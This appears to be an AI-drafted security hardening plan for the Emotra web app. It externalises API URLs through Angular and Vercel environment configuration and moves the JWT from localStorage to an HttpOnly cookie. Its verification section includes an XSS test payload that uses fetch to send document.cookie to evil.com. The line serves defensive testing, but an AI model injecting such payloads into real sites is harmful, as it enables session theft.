# Hardening Emotra: Environment Configuration & Secure Token Storage

This plan addresses the two architectural weak points identified in the project rating report:
1. **Hardcoded API Configurations** — URLs baked directly into source files
2. **Session Token Storage** — JWT stored in `localStorage`, vulnerable to XSS exfiltration

---

## User Review Required

> [!IMPORTANT]
> **Backend Coordination Required.** Weak Point #2 (Secure Token Storage) requires changes on the .NET backend to issue and validate `HttpOnly` cookies. This plan covers the **frontend-side contract** in full detail. You will need to coordinate with whoever manages the ASP.NET backend to implement the cookie-issuing endpoints described in **Phase 2**.

> [!WARNING]
> **Breaking Change.** After Phase 2 is deployed, all existing user sessions will be invalidated because tokens will no longer be read from `localStorage`. Users will need to log in again once. This is expected and acceptable for a security migration.

---

## Open Questions

1. **Do you have access to the .NET backend codebase**, or is it managed by a teammate? This determines whether we scope the backend cookie changes into this plan or produce a specification document for the backend developer.
2. **Vercel Environment Variables** — Are you using Vercel's dashboard to manage environment variables, or do you use a `.env` file locally? This affects how we wire `vercel.json` rewrites.
3. **Do Image/Video model endpoints exist yet**, or should we only plan for `apiUrl`, `textApiUrl`, and `audioApiUrl` for now?

---

## Proposed Changes

### Phase 1 — Environment Configuration Hardening

**Goal:** Eliminate all hardcoded API URLs from source code. Use Angular's native `fileReplacements` build mechanism so that different builds (development, staging, production) automatically inject the correct endpoints with zero code changes.

---

#### [NEW] [environment.prod.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/environments/environment.prod.ts)

Create a production environment file that mirrors the structure of the development file but contains production-specific values:

```typescript
export const environment = {
  production: true,
  apiUrl: "https://emotion-detection.runasp.net",
  textApiUrl: "https://emotra.vercel.app/text",
  audioApiUrl: "https://emotra.vercel.app/audio",
  tokenKey: "emotra_token",
  userKey: "emotra_user",
};
```

> [!NOTE]
> The `tokenKey` and `userKey` fields will be **removed entirely** in Phase 2 when we migrate to cookie-based auth. For now, they remain for backward compatibility.

---

#### [MODIFY] [environment.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/environments/environment.ts)

Clean up the development environment file by removing commented-out IP addresses and clearly documenting its purpose:

```diff
 export const environment = {
   production: false,
-  apiUrl: "https://emotion-detection.runasp.net",
-  // textApiUrl: "http://13.63.140.123:8000",
-  // audioApiUrl: "http://13.51.255.179:8001",//
-  textApiUrl: "https://graduation-project-website-eight.vercel.app/text",
-  audioApiUrl: "https://graduation-project-website-eight.vercel.app/audio",
+  apiUrl: "https://emotion-detection.runasp.net",
+  textApiUrl: "https://graduation-project-website-eight.vercel.app/text",
+  audioApiUrl: "https://graduation-project-website-eight.vercel.app/audio",
   tokenKey: "emotra_token",
   userKey: "emotra_user",
 };
```

---

#### [MODIFY] [angular.json](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/angular.json)

Register the production environment file in Angular's build pipeline using `fileReplacements`:

```diff
 "production": {
   "budgets": [ ... ],
-  "outputHashing": "all"
+  "outputHashing": "all",
+  "fileReplacements": [
+    {
+      "replace": "src/environments/environment.ts",
+      "with": "src/environments/environment.prod.ts"
+    }
+  ]
 },
```

**Effect:** When you run `ng build` (production by default), Angular will automatically swap `environment.ts` → `environment.prod.ts`. The development file is used only during `ng serve`.

---

#### [MODIFY] [vercel.json](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/vercel.json)

Replace hardcoded IP addresses with Vercel environment variable references:

```diff
 {
   "routes": [
     {
       "src": "/text/(.*)",
-      "dest": "http://16.171.68.186/$1"
+      "dest": "$TEXT_MODEL_ORIGIN/$1"
     },
     {
       "src": "/audio/(.*)",
-      "dest": "http://13.51.255.179:8001/$1"
+      "dest": "$AUDIO_MODEL_ORIGIN/$1"
     }
   ]
 }
```

Then set these in the **Vercel Dashboard → Settings → Environment Variables**:

| Variable Name | Value | Environment |
|---|---|---|
| `TEXT_MODEL_ORIGIN` | `http://16.171.68.186` | Production |
| `AUDIO_MODEL_ORIGIN` | `http://13.51.255.179:8001` | Production |

**Benefit:** If you migrate your ML models to a new server, you change one Vercel dashboard variable instead of editing code, committing, and redeploying.

---

#### [MODIFY] [model_loader_audio_v2.py](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/python/model_loader_audio_v2.py)

Replace the hardcoded `TEXT_API_URL` with an environment variable:

```diff
-TEXT_API_URL  = "http://127.0.0.1:8022/emotion/text_model"
+TEXT_API_URL  = os.environ.get("TEXT_API_URL", "http://127.0.0.1:8022/emotion/text_model")
```

**Effect:** In production, you set the `TEXT_API_URL` env var on the server. Locally, the fallback `127.0.0.1:8022` still works without any configuration.

---

### Phase 2 — Secure Token Storage Migration

**Goal:** Move the JWT authentication token from `localStorage` (readable by any script on the page) to an `HttpOnly`, `Secure`, `SameSite=Strict` cookie (invisible to JavaScript, immune to XSS exfiltration).

> [!IMPORTANT]
> **Architectural Distinction.** This migration targets **only the JWT authentication token** (`emotra_token` / `emotra_admin_token`). All other `localStorage` usage (analysis cache, theme preferences, alert stats, sidebar state) is **non-sensitive UI data** and remains in `localStorage` by design. This is the correct architectural split — sensitive credentials in cookies, application state in client storage.

---

#### What Changes on the Backend (Specification for .NET Team)

The backend must be updated to:

1. **On Login Success (`POST /api/auth/login`):** Instead of returning the JWT in the JSON body, set it as a cookie:

```csharp
Response.Cookies.Append("emotra_auth", jwt, new CookieOptions
{
    HttpOnly  = true,       // JavaScript cannot read this
    Secure    = true,       // Only sent over HTTPS
    SameSite  = SameSiteMode.Strict, // Not sent on cross-site requests
    Path      = "/",
    Expires   = tokenExpiry // Match your JWT expiration
});
```

The JSON response body should **still return user profile data** (name, email, roles, `expires_at`) but **omit the `token` field**.

2. **On Logout (`POST /api/auth/logout`):** Clear the cookie:

```csharp
Response.Cookies.Delete("emotra_auth");
```

3. **Authentication Middleware:** Read the JWT from the cookie header instead of (or in addition to) the `Authorization: Bearer` header.

4. **SignalR Hub:** Read the token from the cookie during the WebSocket handshake instead of the query string `access_token`.

5. **CORS Configuration:** Ensure `AllowCredentials()` is enabled and the `Access-Control-Allow-Origin` is set to the exact Vercel domain (not `*`).

---

#### Frontend Changes

##### [MODIFY] [auth.service.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/app/core/services/auth.service.ts)

**Remove all JWT token storage from localStorage.** The token is now managed exclusively by the browser's cookie jar.

Key changes to `saveAuth()`:
```diff
  private saveAuth(user: AuthUser): void {
    if (!this.isBrowser) return;

-   const isAdmin = user.roles?.includes('ADMIN');
-   const tokenKey = isAdmin ? 'emotra_admin_token' : environment.tokenKey;
-   const userKey = isAdmin ? 'emotra_admin_user' : environment.userKey;
-
-   localStorage.setItem(tokenKey, user.token);
-
-   const { token, ...userWithoutToken } = user;
-   localStorage.setItem(userKey, JSON.stringify(userWithoutToken));
-
-   this.currentUser.set(user);
+   // Token is now in an HttpOnly cookie — we only store the user profile
+   const userKey = user.roles?.includes('ADMIN') ? 'emotra_admin_user' : environment.userKey;
+   const { token, ...userProfile } = user;
+   localStorage.setItem(userKey, JSON.stringify(userProfile));
+   this.currentUser.set(user);
  }
```

Key changes to `getCurrentUser()`:
```diff
  getCurrentUser(): AuthUser | null {
    if (!this.isBrowser) return null;

    const adminData = localStorage.getItem('emotra_admin_user');
    const userData = localStorage.getItem(environment.userKey);
    const raw = adminData || userData;

    if (raw) {
      try {
-       const user = JSON.parse(raw) as AuthUser;
-       const tokenKey = adminData ? 'emotra_admin_token' : environment.tokenKey;
-       const token = localStorage.getItem(tokenKey);
-       if (token) {
-         user.token = token;
-       }
-       return user;
+       return JSON.parse(raw) as AuthUser;
      } catch (e) {
        return null;
      }
    }
    return null;
  }
```

Key changes to `isAuthenticated()`:
```diff
  isAuthenticated(): boolean {
    if (!this.isBrowser) return false;

    const user = this.currentUser();
-   if (!user || !user.token || !user.expires_at) return false;
+   if (!user || !user.expires_at) return false;
+   // Token is in HttpOnly cookie — we trust the expires_at timestamp
+   // The server will reject expired tokens regardless

    try {
      const expiry = new Date(user.expires_at);
      if (expiry <= new Date()) {
        this.clearAllAuth();
        return false;
      }
      return true;
    } catch (e) {
      return false;
    }
  }
```

Key changes to `clearAllAuth()` — remove token keys from the cleanup list:
```diff
  const coreKeys = [
-   environment.tokenKey,
    environment.userKey,
-   'emotra_admin_token',
    'emotra_admin_user',
    'emotra_alert_settings',
    ...
  ];
```

Add a new `logout()` that calls the backend to clear the cookie:
```diff
- logout(isForced: boolean = false): void {
+ logout(isForced: boolean = false): void {
    if (this.isBrowser) {
+     // Tell the server to clear the HttpOnly cookie
+     this.http.post(`${environment.apiUrl}/api/auth/logout`, {}).subscribe();
      this.clearAllAuth();
      this.alertsService.stopSignalR();
      if (!isForced) {
        this.clearBanDetails();
      }
      this.router.navigate(['/auth/login']);
    }
  }
```

---

##### [MODIFY] [api.interceptor.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/app/core/interceptors/api.interceptor.ts)

Replace manual `Authorization` header injection with `withCredentials: true` so the browser automatically sends the `HttpOnly` cookie:

```diff
  export const apiInterceptor: HttpInterceptorFn = (req, next) => {
    const authService = inject(AuthService);

    const isAuthEndpoint = req.url.toLowerCase().includes('/api/auth/login') ||
      req.url.toLowerCase().includes('/api/auth/register') ||
      req.url.toLowerCase().includes('/api/auth/forgot-password') ||
      req.url.toLowerCase().includes('/api/auth/reset-password');

    let authReq = req;

-   // 2. Attach JWT token from signal if exists
-   const user = authService.currentUser();
-   if (!isAuthEndpoint && user?.token) {
-     authReq = req.clone({
-       setHeaders: {
-         Authorization: `Bearer ${user.token}`
-       }
-     });
-   }
+   // 2. Attach credentials so browser sends HttpOnly cookie automatically
+   if (!isAuthEndpoint) {
+     authReq = req.clone({ withCredentials: true });
+   }

    // 3. Strip Content-Type for FormData...
    if (authReq.body instanceof FormData) {
```

---

##### [MODIFY] [alerts.service.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/app/core/services/alerts.service.ts)

Update `initSignalR()` — the token no longer needs to be passed explicitly. The cookie is sent automatically during the WebSocket handshake:

```diff
- initSignalR(token: string) {
+ initSignalR() {
    if (this.hubConnection) {
      return;
    }

    this.hubConnection = new HubConnectionBuilder()
      .withUrl(`${environment.apiUrl}/hubs/notifications`, {
-       accessTokenFactory: () => token,
+       withCredentials: true,  // Browser sends HttpOnly cookie
        skipNegotiation: false
      })
```

Update `isUserAuthenticated()` — no longer checks `localStorage` for the token:

```diff
  private isUserAuthenticated(): boolean {
    if (typeof window === 'undefined') return false;
-   const token = localStorage.getItem(environment.tokenKey);
-   return !!token;
+   // Delegate to AuthService signal — token is in cookie, we trust user profile presence
+   const user = localStorage.getItem(environment.userKey) || localStorage.getItem('emotra_admin_user');
+   return !!user;
  }
```

---

##### [MODIFY] [environment.ts](file:///c:/Users/Ahmed%20Mahmoud/Desktop/Graduation%20Project/Project%20Website/src/environments/environment.ts) (Phase 2 final)

Remove the now-unused `tokenKey`:

```diff
 export const environment = {
   production: false,
   apiUrl: "https://emotion-detection.runasp.net",
   textApiUrl: "https://graduation-project-website-eight.vercel.app/text",
   audioApiUrl: "https://graduation-project-website-eight.vercel.app/audio",
-  tokenKey: "emotra_token",
   userKey: "emotra_user",
 };
```

---

## Summary of What Stays in localStorage vs. What Moves to Cookies

| Data | Storage | Rationale |
|---|---|---|
| **JWT Token** | ~~localStorage~~ → **HttpOnly Cookie** | Sensitive credential, must be XSS-proof |
| User Profile (name, email, roles, expires_at) | `localStorage` | Non-sensitive display data, needed for UI rendering |
| Theme Colors, Sidebar State | `localStorage` | Device-specific preferences, no security impact |
| Analysis Cache, Alert Stats | `localStorage` | Performance cache, reconstructible from API |
| Ban Details | `sessionStorage` | Ephemeral session flag, cleared on tab close |
| Compare/History State | `sessionStorage` | Ephemeral UI state, cleared on tab close |

---

## Verification Plan

### Phase 1 Verification
- Run `ng serve` → Confirm dev environment loads with development URLs
- Run `ng build --configuration production` → Inspect `dist/` bundle for production URLs (no dev IPs should appear)
- Deploy to Vercel with env vars set → Confirm `/text/` and `/audio/` proxy routes resolve correctly

### Phase 2 Verification
- **Manual Test:** Log in → Open DevTools → Application → Cookies → Confirm `emotra_auth` cookie exists with `HttpOnly`, `Secure`, `SameSite=Strict` flags
- **Manual Test:** Open DevTools → Console → Run `document.cookie` → Confirm the auth cookie is **NOT** visible (HttpOnly)
- **Manual Test:** Open DevTools → Application → Local Storage → Confirm no `emotra_token` or `emotra_admin_token` keys exist
- **XSS Simulation:** Inject `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` into any user-controlled text field → Confirm the auth cookie is not exfiltrated
- **SignalR:** Confirm real-time alerts still work after the migration by triggering a test alert from the admin panel
